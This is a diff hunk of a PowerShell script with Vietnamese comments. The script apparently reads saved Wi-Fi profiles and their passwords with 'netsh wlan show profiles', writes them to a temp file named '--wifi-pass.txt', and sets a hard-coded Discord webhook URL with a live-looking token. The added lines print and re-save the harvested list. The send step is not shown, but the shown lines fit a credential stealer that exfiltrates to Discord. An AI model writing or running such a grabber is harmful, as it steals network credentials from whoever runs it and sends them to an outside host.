@@ -5,6 +5,12 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$
 
 $wifiProfiles > $env:TEMP/--wifi-pass.txt
 
+# In ra màn hình
+$wifiProfiles | Format-Table -AutoSize
+
+# Xuất ra file tạm
+$wifiProfiles | Format-Table -AutoSize | Out-String > "$env:TEMP/--wifi-pass.txt"
+
 # Webhook Discord
 $dc = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
 
